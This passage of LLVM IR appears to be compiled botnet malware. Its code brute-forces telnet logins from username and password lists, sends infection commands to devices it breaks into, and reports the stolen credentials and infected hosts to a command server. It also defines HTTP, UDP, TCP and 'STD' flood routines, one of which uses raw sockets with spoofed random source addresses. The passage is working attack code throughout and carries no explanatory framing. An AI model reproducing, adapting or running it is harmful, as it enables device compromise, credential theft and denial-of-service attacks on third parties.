  %178 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %177
  %179 = load i8*, i8** %178, align 8
  %180 = call i64 @strlen(i8* %179) #15
  %181 = call i64 @send(i32 %174, i8* %179, i64 %180, i32 16384) #5
  %182 = icmp slt i64 %181, 0
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %172
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:184:                                    ; preds = %172
  %185 = load i32, i32* %173, align 16
  %186 = call i64 @send(i32 %185, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i64 0, i64 0), i64 2, i32 16384) #5
  %187 = icmp slt i64 %186, 0
  br i1 %187, label %188, label %189

; <label>:188:                                    ; preds = %184
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:189:                                    ; preds = %184
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 6)
  br label %286

; <label>:190:                                    ; preds = %40
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @read_until_response(i32 %192, i32 10, i8* %194, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %196 = icmp eq i32 %195, 0
  br i1 %196, label %227, label %197

; <label>:197:                                    ; preds = %190
  %198 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %198, i32* %35, align 16
  %199 = load i8*, i8** %193, align 8
  %200 = call i32 @contains_fail(i8* %199)
  %201 = icmp eq i32 %200, 0
  br i1 %201, label %203, label %202

; <label>:202:                                    ; preds = %197
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 0)
  br label %286

; <label>:203:                                    ; preds = %197
  %204 = load i8*, i8** %193, align 8
  %205 = call i32 @contains_success(i8* %204)
  %206 = icmp eq i32 %205, 0
  br i1 %206, label %226, label %207

; <label>:207:                                    ; preds = %203
  %208 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  %209 = load i8, i8* %208, align 1
  %210 = icmp eq i8 %209, 2
  br i1 %210, label %211, label %212

; <label>:211:                                    ; preds = %207
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 7)
  br label %286

; <label>:212:                                    ; preds = %207
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %34)
  %215 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 4
  %216 = load i8, i8* %215, align 2
  %217 = zext i8 %216 to i64
  %218 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %217
  %219 = load i8*, i8** %218, align 8
  %220 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 5
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i64
  %223 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %222
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 %213, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.308, i64 0, i64 0), i8* %214, i8* %219, i8* %224)
  call void @advance_state(%struct.telstate_t* nonnull %34, i32 7)
  br label %286

; <label>:226:                                    ; preds = %203
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:227:                                    ; preds = %190
  %228 = load i32, i32* %35, align 16
  %229 = add i32 %228, 7
  %230 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %231 = icmp ult i32 %229, %230
  br i1 %231, label %232, label %286

; <label>:232:                                    ; preds = %227
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:233:                                    ; preds = %40
  %234 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  store i32 %234, i32* %35, align 16
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %236 = load i32, i32* %235, align 16
  %237 = call i64 @send(i32 %236, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i64 0, i64 0), i64 4, i32 16384) #5
  %238 = load i32, i32* %235, align 16
  %239 = call i64 @send(i32 %238, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.310, i64 0, i64 0), i64 7, i32 16384) #5
  %240 = load i32, i32* %235, align 16
  %241 = load i8*, i8** @infect, align 8
  %242 = call i64 @strlen(i8* %241) #15
  %243 = call i64 @send(i32 %240, i8* %241, i64 %242, i32 16384) #5
  %244 = icmp slt i64 %243, 0
  br i1 %244, label %245, label %252

; <label>:245:                                    ; preds = %233
  %246 = load i32, i32* %235, align 16
  %247 = load i8*, i8** @infect2, align 8
  %248 = call i64 @strlen(i8* %247) #15
  %249 = call i64 @send(i32 %246, i8* %247, i64 %248, i32 16384) #5
  %250 = icmp slt i64 %249, 0
  br i1 %250, label %251, label %252

; <label>:251:                                    ; preds = %245
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:252:                                    ; preds = %245, %233
  %253 = load i32, i32* %235, align 16
  %254 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 9
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @read_until_response(i32 %253, i32 10, i8* %255, i32 512, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i64 0, i64 0))
  %257 = icmp eq i32 %256, 0
  br i1 %257, label %280, label %258

; <label>:258:                                    ; preds = %252
  %259 = load i8*, i8** %254, align 8
  %260 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8**, ...)*)(i8* %259, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infectedmessage, i64 0, i64 0)) #5
  %261 = icmp eq i32 %260, 0
  br i1 %261, label %280, label %262

; <label>:262:                                    ; preds = %258
  %263 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 3
  %264 = load i8, i8* %263, align 1
  %265 = icmp eq i8 %264, 3
  br i1 %265, label %280, label %266

; <label>:266:                                    ; preds = %262
  %267 = load i32, i32* @mainCommSock, align 4
  %268 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %34)
  %269 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 4
  %270 = load i8, i8* %269, align 2
  %271 = zext i8 %270 to i64
  %272 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %271
  %273 = load i8*, i8** %272, align 8
  %274 = getelementptr inbounds [1000 x %struct.telstate_t], [1000 x %struct.telstate_t]* %15, i64 0, i64 %indvars.iv, i32 5
  %275 = load i8, i8* %274, align 1
  %276 = zext i8 %275 to i64
  %277 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %276
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 (i32, i8*, ...) @sockprintf(i32 %267, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.311, i64 0, i64 0), i8* %268, i8* %273, i8* %278)
  store i8 3, i8* %263, align 1
  br label %280

; <label>:280:                                    ; preds = %262, %258, %252, %266
  %281 = load i32, i32* %35, align 16
  %282 = add i32 %281, 8
  %283 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %284 = icmp ult i32 %282, %283
  br i1 %284, label %285, label %286

; <label>:285:                                    ; preds = %280
  call void @reset_telstate(%struct.telstate_t* nonnull %34)
  br label %286

; <label>:286:                                    ; preds = %40, %152, %189, %83, %82, %115, %110, %134, %129, %171, %166, %232, %227, %285, %280, %202, %211, %212, %226, %164, %165, %127, %128, %103, %104, %66, %251, %188, %183, %151, %146, %109, %65, %62
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 1000
  br i1 %exitcond, label %.loopexit.loopexit, label %33
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #5
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #5
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #5
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #5
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #5
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #6

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %9 = add nsw i32 %8, %4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %11 = tail call i32 @rand() #5
  %12 = srem i32 %11, 3
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %13
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @rand() #5
  %17 = srem i32 %16, 65
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [62 x i8*], [62 x i8*]* @sendHTTP.useragents, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %10, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.377, i64 0, i64 0), i8* %1, i8* %3, i8* %15, i8* %20) #5
  %22 = icmp sgt i32 %5, 0
  br i1 %22, label %.lr.ph13.preheader, label %._crit_edge14

.lr.ph13.preheader:                               ; preds = %6
  br label %.lr.ph13

; <label>:23:                                     ; preds = %.lr.ph13
  %24 = icmp slt i32 %27, %5
  br i1 %24, label %.lr.ph13, label %._crit_edge14.loopexit

.lr.ph13:                                         ; preds = %.lr.ph13.preheader, %23
  %.011 = phi i32 [ %27, %23 ], [ 0, %.lr.ph13.preheader ]
  %25 = tail call i32 @fork() #5
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.011, 1
  br i1 %26, label %23, label %.preheader

.preheader:                                       ; preds = %.lr.ph13
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %29 = icmp sgt i32 %9, %28
  br i1 %29, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %30 = tail call i32 @socket_connect(i8* %0, i16 zeroext %2)
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %.backedge, label %32

; <label>:32:                                     ; preds = %.lr.ph
  %33 = call i64 @strlen(i8* nonnull %10) #15
  %34 = call i64 @write(i32 %30, i8* nonnull %10, i64 %33) #5
  %35 = tail call i32 @close(i32 %30) #5
  br label %.backedge

.backedge:                                        ; preds = %32, %.lr.ph
  %36 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %37 = icmp sgt i32 %9, %36
  br i1 %37, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @_exit(i32 1) #17
  unreachable

._crit_edge14.loopexit:                           ; preds = %23
  br label %._crit_edge14

._crit_edge14:                                    ; preds = %._crit_edge14.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #5
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %7 = sext i32 %6 to i64
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #5
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #5
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %25 = sext i32 %2 to i64
  %26 = add nsw i64 %7, %25
  br label %27

; <label>:27:                                     ; preds = %42, %3
  %.0 = phi i32 [ 0, %3 ], [ %43, %42 ]
  %28 = call i32 @rand() #5
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %27
  %31 = sext i32 %28 to i64
  %32 = urem i64 %31, 36
  %33 = getelementptr inbounds [36 x i8*], [36 x i8*]* @sendSTD.randstrings, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @send(i32 %5, i8* %34, i64 75, i32 0) #5
  %36 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %24, i32 16) #5
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %26
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %30
  %41 = call i32 @close(i32 %5) #5
  call void @_exit(i32 0) #17
  unreachable

; <label>:42:                                     ; preds = %30, %27
  %.1 = phi i32 [ %.0, %27 ], [ 0, %30 ]
  %43 = add i32 %.1, 1
  br label %27
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #5
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #5
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %39 = add nsw i32 %38, %2
  %40 = sext i32 %4 to i64
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %42 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %40, i32 0, %struct.sockaddr* nonnull %41, i32 16) #5
  %43 = icmp eq i32 %.058, %5
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %.backedge
  br i1 %10, label %45, label %48

; <label>:45:                                     ; preds = %44
  %46 = call i32 @rand_cmwc()
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %18, align 2
  br label %48

; <label>:48:                                     ; preds = %45, %44
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %50 = icmp sgt i32 %49, %39
  br i1 %50, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:51:                                     ; preds = %.backedge
  %52 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %51, %48
  %.058.be = phi i32 [ %52, %51 ], [ 0, %48 ]
  br label %.backedge

; <label>:53:                                     ; preds = %22
  %54 = tail call i32 @socket(i32 2, i32 3, i32 17) #5
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i64 0, i64 0))
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  store i32 1, i32* %8, align 4
  %60 = bitcast i32* %8 to i8*
  %61 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* nonnull %60, i32 4) #5
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %59
  br label %.preheader

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.05962, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #5
  %70 = call i32 @rand() #5
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.060 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @getRandomIP(i32 %.060)
  %85 = call i32 @htonl(i32 %84) #18
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #18
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #18
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %.pre-phi = phi i16 [ %98, %97 ], [ 0, %95 ]
  %102 = phi i32 [ %100, %97 ], [ %96, %95 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %79, i64 28
  call void @makeRandomStr(i8* %108, i32 %4)
  %109 = bitcast i8* %79 to i16*
  %110 = getelementptr inbounds i8, i8* %79, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %79, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %118 = add nsw i32 %117, %2
  %119 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %79, i64 4
  %121 = bitcast i8* %120 to i16*
  %122 = getelementptr inbounds i8, i8* %79, i64 12
  %123 = bitcast i8* %122 to i32*
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %101
  %.0 = phi i32 [ 0, %101 ], [ %.0.be, %.backedge61.backedge ]
  %124 = call i64 @sendto(i32 %54, i8* nonnull %79, i64 %77, i32 0, %struct.sockaddr* nonnull %119, i32 16) #5
  %125 = call i32 @rand_cmwc()
  %126 = trunc i32 %125 to i16
  store i16 %126, i16* %94, align 4
  br i1 %10, label %127, label %129

; <label>:127:                                    ; preds = %.backedge61
  %128 = call i32 @rand_cmwc()
  br label %132

; <label>:129:                                    ; preds = %.backedge61
  %130 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #18
  %131 = zext i16 %130 to i32
  br label %132

; <label>:132:                                    ; preds = %129, %127
  %133 = phi i32 [ %128, %127 ], [ %131, %129 ]
  %134 = trunc i32 %133 to i16
  store i16 %134, i16* %105, align 2
  %135 = call i32 @rand_cmwc()
  %136 = trunc i32 %135 to i16
  store i16 %136, i16* %121, align 4
  %137 = call i32 @getRandomIP(i32 %.060)
  %138 = call i32 @htonl(i32 %137) #18
  store i32 %138, i32* %123, align 4
  %139 = load i16, i16* %111, align 2
  %140 = zext i16 %139 to i32
  %141 = call zeroext i16 @csum(i16* nonnull %109, i32 %140)
  store i16 %141, i16* %116, align 2
  %142 = icmp eq i32 %.0, %5
  br i1 %142, label %143, label %146

; <label>:143:                                    ; preds = %132
  %144 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %145 = icmp sgt i32 %144, %118
  br i1 %145, label %148, label %.backedge61.backedge

; <label>:146:                                    ; preds = %132
  %147 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %146, %143
  %.0.be = phi i32 [ %147, %146 ], [ 0, %143 ]
  br label %.backedge61

; <label>:148:                                    ; preds = %143
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %148, %63, %56, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #5
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #5
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
